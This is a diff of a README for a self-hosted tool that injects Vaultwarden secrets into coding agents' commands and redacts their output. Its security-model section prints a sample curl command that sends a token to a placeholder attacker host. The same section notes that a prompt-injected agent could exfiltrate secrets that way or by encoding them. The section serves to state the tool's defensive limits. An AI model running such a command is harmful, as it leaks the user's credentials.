@@ -1,316 +1,295 @@
-# @piskill/pi-vaultwarden
+<div align="center">
 
-Self-hosted Vaultwarden secret handling for **pi**, **omp**, and **Claude Code**.
+# keyshroud
 
-The package keeps credentials in Vaultwarden, unlocks through local Keychain
-credentials, resolves references on the machine, and injects only the required
-values into child-process environments. Agent-visible diagnostics report names
-and status, never secret values.
+**Your agents use the keys. They never see them.**
 
-> The npm name `@piskill/pi-vaultwarden` is currently available. This repository
-> is prepared for a future publish; it is not published yet.
+Agent-safe secrets for Claude Code, Codex, Cursor, pi and omp — backed by your own
+self-hosted [Vaultwarden](https://github.com/dani-garcia/vaultwarden) (or Bitwarden).
 
-## What it provides
+[![npm](https://img.shields.io/npm/v/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
+[![CI](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml/badge.svg)](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml)
+[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Node](https://img.shields.io/node/v/keyshroud.svg)](package.json)
 
-- Runtime-neutral core with no pi/omp imports.
-- Pi/omp extension:
-  - `/vaultwarden_add`
-  - `/vaultwarden_setup`
-  - `/vaultwarden_rotate`
-  - `/vaultwarden_diagnose`
-  - `vw_add_secret`
-  - `vw_diagnose`
-- CLI for shell, CI, and Claude Code integration.
-- Masked input for creating and rotating secrets.
-- Atomic, locked updates to pi and omp `auth.json` files.
-- Cold-start unlock from macOS Keychain or Linux `secret-tool`.
+[Quickstart](#quickstart) · [How it works](#how-it-works) · [Claude Code](#claude-code) · [pi / omp](#pi--omp) · [MCP](#any-mcp-client-codex-cursor-claude-desktop) · [Security model](#security-model) · [Comparison](docs/competitors.md)
 
-## Requirements
+</div>
 
-- Node.js `>=22.18.0`.
-- Bitwarden CLI (`bw`) in `PATH`.
-- A Vaultwarden server configured with `bw config server`.
-- Keychain entries for:
-  - `vaultwarden-api-client-id`
-  - `vaultwarden-api-client-secret`
-  - `vaultwarden-master-password`
-- pi `>=0.80.10` or omp with TypeBox-compatible extension support.
+```console
+$ keyshroud run --mask -- sh -c 'echo "deploying with $GH_TOKEN"; curl -sf -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user | jq .login'
+deploying with <redacted:GH_TOKEN>
+"dinhkarate"
+```
 
-The current development deployment uses `https://vault.thatnghiep.dev`. The
-core constant can be changed for another server, but `bw config server` remains
-the source of truth for the CLI.
+The command got the real token. The transcript — and the model reading it — got
+`<redacted:GH_TOKEN>`. (Masking is automatic when an agent runs the command;
+`--mask` forces it in a human terminal.)
 
-## Install for pi
+## Why
 
-From npm after publication:
+Coding agents need credentials to do real work: `gh`, `npm publish`, cloud CLIs,
+webhooks, databases. The usual options are bad:
+
+- **Paste the key into the chat.** It is now in the transcript, the provider's
+  logs, and every future context window.
+- **Put it in `.env`.** The agent reads `.env`, `cat`s it while debugging, or
+  commits it.
+- **Use a paid secrets manager.** Good, but `op run` needs a 1Password
+  subscription, and most "agent vaults" are hosted SaaS.
+
+keyshroud keeps secrets in a vault you host, hands agents **names and
+references**, injects values only into the child processes that need them, and
+scrubs every value from tool output before the model sees it.
+
+## Features
+
+| | |
+|---|---|
+| 🙈 **Masked output** | `keyshroud run` replaces every secret value in stdout/stderr with `<redacted:NAME>` — streaming-safe across chunk boundaries. |
+| 🪝 **Agent hooks** | Claude Code `PostToolUse` and pi/omp `tool_result` hooks redact **every** tool result (Bash, Read, Grep, MCP…), not just commands you remembered to wrap. |
+| 🔌 **MCP server** | `keyshroud mcp` gives any MCP client `secrets_run`, `secrets_list`, `secrets_request`, `vault_status`. No tool ever returns a value. |
+| 🔗 **Commit-safe references** | `bw://item`, `bw://item/username`, `bw://item/fields/name`, `bw://item/totp` in `.env.refs` files and templates. |
+| ⌨️ **Paste-to-create** | New secrets go through a masked prompt in the user's terminal or a masked popup in pi — never through the chat. |
+| 📄 **`inject`** | Render `{{ bw://… }}` templates into `0600` config files for tools that can't read env vars (`.npmrc`, kubeconfig). |
+| 🔎 **`scan`** | Find vault values that leaked into your working tree (pre-commit friendly). |
+| ⚡ **Fast** | One batched `bw list items` per session instead of one `bw get` (~3 s) per secret. |
+| 🏠 **Self-hosted, free** | Vaultwarden on a $5 VPS or a Raspberry Pi. No SaaS account, no telemetry. |
+| 🧾 **Audit log** | `audit.jsonl` records which *names* were used, when, by which command. Never values. |
+
+## Quickstart
+
+**Requirements:** Node.js ≥ 22.18, the Bitwarden CLI (`npm i -g @bitwarden/cli`),
+and a Vaultwarden or Bitwarden account. No server yet? See
+[docs/self-hosting.md](docs/self-hosting.md) — it's one `docker compose up`.
 
 ```bash
-npm install -g @piskill/pi-vaultwarden
-pi install @piskill/pi-vaultwarden
+npm install -g keyshroud
+
+# 1. Point bw at your server and log in once
+bw config server https://vault.example.com
+bw login
+
+# 2. Let keyshroud unlock without prompting (stored in the OS keychain)
+security add-generic-password -a "$USER" -s vaultwarden-master-password -w      # macOS: prompts for the value
+# Linux: secret-tool store --label=vaultwarden service vaultwarden-master-password account "$USER"
+
+# 3. Check everything
+keyshroud doctor
+
+# 4. Store a secret — typed into a masked prompt, never echoed
+keyshroud add --env GH_TOKEN --item "GitHub CLI token" --notes "gh for agents"
+
+# 5. Use it
+keyshroud run -- gh auth status
+keyshroud run -- claude          # start an agent with every wired secret available
 ```
 
-From this repository during development:
+Optional: put `vaultwarden-api-client-id` / `vaultwarden-api-client-secret` (from
+*Settings → Security → Keys → API key*) in the keychain too, and keyshroud will
+also re-login automatically when the `bw` session expires.
 
-```bash
-git clone https://github.com/dinhkarate/pi-vaultwarden.git
-pi install ./pi-vaultwarden
+## How it works
+
+```
+                     ┌──────────────────── your machine ────────────────────┐
+ Vaultwarden  ◄─bw─► │ keyshroud ── resolves bw:// refs (1 batched call) ──► child process env
+ (self-hosted)       │     │                                                │      │ stdout/stderr
+                     │     └── redactor ◄────────────────────────────────────┘◄─────┘
+                     │              │ <redacted:NAME>                                │
+                     └──────────────┼────────────────────────────────────────────────┘
+                                    ▼
+                       agent transcript / LLM provider
 ```
 
-The package manifest declares the extension entry through `pi.extensions` and
-exposes the `pi-vaultwarden` binary.
-
-## Install for omp
-
-Install or link the package in the omp plugin/package location supported by your
-omp setup. The extension entry is `index.ts`; omp rewrites the legacy pi
-compatibility imports to its host copies.
-
-For a local checkout, explicitly load it while testing:
-
-```bash
-omp -e ./extensions/pi-vaultwarden/index.ts
-```
-
-## First-time setup
-
-Configure the server and verify the CLI:
-
-```bash
-bw config server https://vault.thatnghiep.dev
-node cli.ts status
-```
-
-`status` attempts a cold-start unlock. It reads the master password and API
-credentials from Keychain, logs in when necessary, runs `bw unlock`, and caches
-the resulting session in:
-
-```text
-~/.config/pi-vaultwarden/session  # mode 0600
-```
-
-The session token is never printed. `BW_SESSION` does not need to be exported.
-
-## CLI usage
-
-During development run `node cli.ts`. After linking or npm installation use
-`pi-vaultwarden`.
-
-```bash
-pi-vaultwarden status
-pi-vaultwarden unlock
-pi-vaultwarden env
-pi-vaultwarden env --shell
-```
-
-`env` prints names only. `env --shell` prints shell exports because that is an
-explicit request to publish values to the current shell; do not commit or log
-that output.
-
-### Resolve an existing entry
-
-```bash
-pi-vaultwarden get PI_DISCORD_WEBHOOK_URL
-pi-vaultwarden api-key --item 'Thatnghiep Claude Proxy'
-```
-
-Secret values are written to stdout without a trailing newline. They are not
-included in normal status, diagnostics, or mutation output.
-
-### Run a command with injected secrets
-
-```bash
-pi-vaultwarden exec -- claude
-pi-vaultwarden exec -- env
-```
-
-The child receives resolved uppercase environment entries from pi and omp
-`auth.json`; provider credential keys are excluded from broad environment
-injection.
-
-### Create a new secret without shell variables
-
-Pipe the value through stdin:
-
-```bash
-printf '%s' 'paste-secret-here' | \
-  pi-vaultwarden add \
-    --env GH_TOKEN \
-    --item 'GitHub CLI token' \
-    --notes 'Token for local GitHub automation' \
-    --stdin
-```
-
-The command creates a login item, wires a name-based reference into both auth
-stores by default, and reports only item/name/target/verification state.
-Existing target keys are not overwritten. An item can be created before an auth
-write conflict is reported with exit code `5`.
-
-Use `--target omp`, `--target pi`, or `--target both` to limit wiring.
-
-### Rotate and wire
-
-```bash
-printf '%s' 'replacement-secret' | \
-  pi-vaultwarden rotate --item 'GitHub CLI token' --stdin
-
-pi-vaultwarden wire --env GH_TOKEN --item 'GitHub CLI token'
-pi-vaultwarden wire --env GH_TOKEN --item 'GitHub CLI token' --force
-pi-vaultwarden unwire --env GH_TOKEN
-```
-
-References are name-based:
-
-```text
-!bw get password 'GitHub CLI token'
-```
-
-Renaming a Vaultwarden item therefore requires rewiring its consumers.
-
-### Link the CLI
-
-```bash
-pi-vaultwarden link-cli
-pi-vaultwarden link-cli --dir ~/.local/bin --force
-```
-
-The command creates `~/.local/bin/pi-vaultwarden` pointing at the real CLI file.
+1. **Wiring.** A secret is wired by *name*: `GH_TOKEN → bw://GitHub CLI token`.
+   Wiring lives in `~/.pi/agent/auth.json` / `~/.omp/agent/auth.json`
+   (shared with pi/omp) and in project `.env.refs` files. Both are safe to read.
+2. **Unlock.** `bw` is unlocked from the OS keychain; the session token is cached
+   in `~/.config/keyshroud/session` (`0600`).
+3. **Resolve.** All references resolve from one `bw list items` snapshot held in
+   memory for `KEYSHROUD_CACHE_TTL_MS` (default 1 h).
+4. **Inject.** Values go into the child process environment — never into argv,
+   files, or tool results.
+5. **Redact.** Output passes through a redactor that knows every wired value and
+   every login password in the vault. Out-of-process hooks use a keyed-HMAC
+   fingerprint index (`redact-index.json`, `0600`) so they never hold plaintext.
 
 ## Claude Code
 
-Claude Code has no TypeScript extension API. Use one of these explicit paths.
-
-### Model credential helper
+Install the CLI, then the plugin (MCP server + redaction hooks + skill):
 
 ```bash
-pi-vaultwarden claude-setup \
-  --item 'Thatnghiep Claude Proxy' \
-  --ttl-ms 600000
+npm install -g keyshroud
+```
+```text
+/plugin marketplace add dinhkarate/keyshroud
+/plugin install keyshroud@keyshroud
 ```
 
-This writes `apiKeyHelper` to the selected settings file and creates a
-`settings.json.bak-YYYYmmdd-HHMMSS` backup. It refuses to replace an existing
-helper unless `--force` is provided.
+What you get:
 
-`CLAUDE_CODE_API_KEY_HELPER_TTL_MS` controls helper refresh frequency. The
-current account uses Claude Code OAuth, so do not run this against the real
-settings file unless intentionally switching the model credential path. Test
-against a copy:
+- **SessionStart hook** — unlocks, refreshes the redaction index, and tells
+  Claude which secret *names* exist.
+- **PostToolUse hook** — rewrites any tool result that contains a vault value to
+  `<redacted:NAME>` using Claude Code's `updatedToolOutput`.
+- **MCP tools** — `secrets_run`, `secrets_list`, `secrets_request`, `vault_status`.
+- **Skill** — teaches Claude to use names and references, never values.
+
+To give Bash commands the secrets as env vars, start Claude through keyshroud:
 
 ```bash
-cp ~/.claude/settings.json /tmp/claude-settings.json
-pi-vaultwarden claude-setup \
-  --item 'Thatnghiep Claude Proxy' \
-  --settings /tmp/claude-settings.json \
-  --ttl-ms 600000
+keyshroud run -- claude
 ```
 
-### Other secrets
-
-`settings.json` environment values are literals and do not expand shell
-commands. Use the CLI wrapper instead:
+Use a vault item as Claude Code's own API key (`apiKeyHelper`):
 
 ```bash
-pi-vaultwarden exec -- claude
+keyshroud claude-setup --item "Anthropic API key" --ttl-ms 600000
 ```
 
-This supports `GH_TOKEN`, webhooks, proxy keys, and other wired secrets without
-placing plaintext values in Claude Code settings.
+It backs up `settings.json` first and refuses to replace an existing helper
+without `--force`.
 
-## Pi/omp interactive commands
-
-After loading the extension:
-
-- `/secret [description]` asks local Qwen at `sanrokyu-local` to propose an item name, `UPPER_SNAKE_CASE` variable, and purpose. The secret value is entered only afterward in a masked prompt; it is never sent to Qwen. The final notification includes a usage line such as `Usage: getSecret("Item") or process.env.VARIABLE`.
-- `/vaultwarden_add` asks for item name, environment name, purpose, and a
-  masked secret; it creates and wires the item.
-- `/vaultwarden_setup` searches existing items and wires a selected reference.
-- `/vaultwarden_rotate` selects an item and accepts a masked replacement.
-- `/vaultwarden_diagnose` reports status and injected names.
-The `vw_add_secret` tool provides the same paste-to-create flow when requested
-by an agent. The secret is supplied by the user through a masked popup and is
-not returned in the tool result.
-
-### Startup performance and caching
-
-Secret references resolve through one batched `bw list items` call whose
-decrypted result is cached for 7 days by default, shared by the extension load path,
-every `session_start`, and the CLI. Previously each `!bw get password` entry
-spawned its own `bw` process (~3.5s on a cold CLI), so six wired secrets added
-~20 seconds to agent startup. References to deleted or renamed items are
-negative-cached for the same window instead of re-spawning a failing lookup on
-every refresh.
-
-- `PI_VAULTWARDEN_CACHE_TTL_MS` overrides the cache window (milliseconds;
-  `0` disables caching).
-- The extension hydrates the environment before completing extension startup,
-  so `$CUSTOM_ENV_VAR` API-key references are available before provider auth resolution. Resume/fork refreshes remain background and retry exponentially up to 60 seconds.
-- Create/rotate/delete operations invalidate the cache immediately.
-
-## Diagnostics and exit codes
+## pi / omp
 
 ```bash
-pi-vaultwarden doctor
+pi install npm:keyshroud
 ```
 
-Exit codes:
+The extension:
 
-- `0`: success.
-- `2`: usage or argument error.
-- `3`: Vaultwarden unavailable or locked.
-- `4`: secret missing or item name ambiguous.
-- `5`: auth target write conflict.
+- hydrates wired secrets into the agent's environment before provider auth
+  resolves, so `$CUSTOM_KEY` provider references work at startup;
+- redacts every tool result through the `tool_result` hook;
+- adds `/secret` (describe → confirm name → masked paste), `/vault_add`,
+  `/vault_wire`, `/vault_rotate`, `/vault_status`, and the `vault_add_secret` /
+  `vault_status` tools.
+
+`/secret` can ask a local OpenAI-compatible model to propose the item and
+variable names. Only your description is sent — never the value:
+
+```bash
+export KEYSHROUD_PLANNER_URL=http://127.0.0.1:8080/v1/chat/completions
+export KEYSHROUD_PLANNER_MODEL=qwen3-4b
+```
+
+Without a planner, names are derived from the description and you can edit them.
+
+## Any MCP client (Codex, Cursor, Claude Desktop)
+
+```json
+{ "mcpServers": { "keyshroud": { "command": "keyshroud", "args": ["mcp"] } } }
+```
+
+Codex: `codex mcp add keyshroud -- keyshroud mcp`.
+
+| Tool | Does | Returns |
+|---|---|---|
+| `secrets_list` | Lists wired names (+ optional `env_file`) | resolved / unresolved names |
+| `secrets_run` | Runs a shell command with secrets injected (`only`, `env_file`, `cwd`, `timeout_ms`) | exit code + masked stdout/stderr |
+| `secrets_request` | Asks the human to store a new secret | a `keyshroud add …` command for *their* terminal |
+| `vault_status` | Vault lock state, server, item count | status line |
+
+## CLI reference
+
+```text
+keyshroud get <ENV_NAME | bw://ref>          print one value (for scripts; not for agents)
+keyshroud run [--env-file F]... [--only A,B] [--no-auth] [--mask|--no-mask] -- <cmd>
+keyshroud inject [-i template] [-o out] [--force]
+keyshroud redact < log.txt
+keyshroud scan [paths...]
+keyshroud env [--shell]
+keyshroud add --env NAME --item ITEM [--notes TEXT] [--target pi|omp|both] [--stdin]
+keyshroud rotate --item ITEM [--stdin]
+keyshroud wire --env NAME --item ITEM [--target pi|omp|both] [--force]
+keyshroud unwire --env NAME [--target pi|omp|both]
+keyshroud status | unlock | lock | doctor
+keyshroud mcp
+keyshroud hook claude <session-start|post-tool-use>
+keyshroud claude-setup --item ITEM [--settings PATH] [--ttl-ms N] [--force]
+keyshroud api-key --item ITEM
+keyshroud link-cli [--dir DIR] [--force]
+```
+
+`run` masks output whenever stdout is not a terminal (agents, CI, pipes) and
+passes the TTY through untouched for interactive use. Force either way with
+`--mask` / `--no-mask`. `exec` is an alias of `run`.
+
+**Exit codes:** `0` ok · `2` usage · `3` vault locked or unavailable · `4` secret
+missing or item name ambiguous · `5` refusing to overwrite existing state.
+`run` exits with the child's code.
+
+### References
+
+| Reference | Resolves to |
+|---|---|
+| `bw://GitHub CLI token` | login password |
+| `bw://GitHub CLI token/username` | login username (`notes`, `uri`, `id` also work) |
+| `bw://Sentry/fields/dsn` | custom field `dsn` |
+| `bw://AWS root/totp` | current TOTP code |
+| `bw://a%2Fb` | item named `a/b` |
+| `!bw get password 'Item'` | legacy auth.json form, still supported |
+
+Item lookup is case-insensitive by name or exact by id. Duplicate names fail
+closed (exit `4`) instead of guessing.
+
+### Configuration
+
+| Variable | Default | |
+|---|---|---|
+| `KEYSHROUD_CACHE_TTL_MS` | `3600000` | in-memory vault snapshot + session check lifetime; `0` disables |
+| `KEYSHROUD_CONFIG_DIR` | `$XDG_CONFIG_HOME/keyshroud` | session, redact index, audit log |
+| `KEYSHROUD_KEYCHAIN_MASTER` | `vaultwarden-master-password` | keychain service names… |
+| `KEYSHROUD_KEYCHAIN_CLIENT_ID` | `vaultwarden-api-client-id` | |
+| `KEYSHROUD_KEYCHAIN_CLIENT_SECRET` | `vaultwarden-api-client-secret` | |
+| `KEYSHROUD_AUDIT` | on | `0` disables `audit.jsonl` |
+| `KEYSHROUD_PLANNER_URL` / `_MODEL` / `_API_KEY` | unset | optional naming helper for `/secret` |
 
 ## Security model
 
-- Secret values are passed to `bw` through stdin or environment variables, never
-  command arguments.
-- Vaultwarden session tokens are stored with `0600` permissions.
-- Auth writes use an exclusive lock, stale-lock recovery, temp file, and atomic
-  rename.
-- Environment injection excludes known provider keys and accepts only
-  `UPPER_SNAKE_CASE` names.
-- Diagnostics and mutation output contain names and state only.
-- `claude-setup` never silently overwrites an existing helper.
+keyshroud protects against **accidental disclosure**: secrets ending up in
+transcripts, provider logs, screenshots, commits, or the model's context because
+a command printed them.
 
-## Development verification
+It does **not** make a hostile or prompt-injected agent safe. An agent that can
+run `keyshroud run -- curl https://evil.example -d "$TOKEN"`, or base64-encode a
+value before printing it, can exfiltrate it. If that is your threat model, use
+an egress proxy that swaps placeholder credentials on the wire (see
+[docs/competitors.md](docs/competitors.md)), restrict which secrets each session
+gets with `--only`, and keep a human approving commands.
 
-From the repository root:
+Guarantees we test for:
 
-```bash
-node --check core.ts
-node --check cli.ts
-node --check index.ts
-node --check ui/bordered-popups.ts
-```
+- secret values never appear in argv, logs, diagnostics, MCP results, hook
+  output, or `audit.jsonl`;
+- new secrets are read from a masked prompt or stdin, never flags;
+- the session file, redact index, rendered templates and auth files are `0600`;
+- auth.json writes are locked and atomic and never overwrite without `--force`;
+- values shorter than 6 characters are not redacted (to avoid noise), so don't
+  wire short PINs.
 
-End-to-end checks require a configured Vaultwarden account:
+Report vulnerabilities privately — see [SECURITY.md](SECURITY.md).
 
-```bash
-env -u BW_SESSION node cli.ts status
-env -u BW_SESSION node cli.ts env
-```
-
-## Publishing later
-
-The package is intentionally scoped as `@piskill/pi-vaultwarden`. Before the
-first publish:
-
-1. Create or confirm the GitHub repository URL in `package.json`.
-2. Review the package contents with `npm pack --dry-run`.
-3. Ensure no session files, settings backups, credentials, or generated output
-   are in the package.
-4. Run the cold-start, injection, CLI lifecycle, Claude helper-copy, and
-   reference-audit checks.
-5. Publish from this standalone repository:
+## Development
 
 ```bash
-npm login
-npm publish --access public
+npm install
+npm run check        # typecheck + tests (fake bw, no real vault) + build
+node src/cli.ts doctor   # run from source (Node ≥ 22.18 strips types)
 ```
 
-The package is **not published yet**; npm registry checks currently return 404
-for both `pi-vaultwarden` and `@piskill/pi-vaultwarden`.
+See [CONTRIBUTING.md](CONTRIBUTING.md). The runtime-neutral core is in
+`src/core.ts`; agent integrations live in `extensions/`, `src/mcp.ts` and
+`src/hooks.ts`.
+
+## Credits
+
+Inspired by [@jmcombs/pi-1password](https://www.npmjs.com/package/@jmcombs/pi-1password)
+— its popup UI and diagnostics shape are ported here (MIT). Masked output follows
+1Password's `op run`. Not affiliated with Bitwarden, Inc. or the Vaultwarden
+project; "Bitwarden" is a trademark of Bitwarden, Inc.
 
 ## License
 
-MIT — © 2026 dinhkarate
+[MIT](LICENSE) © 2026 dinhkarate
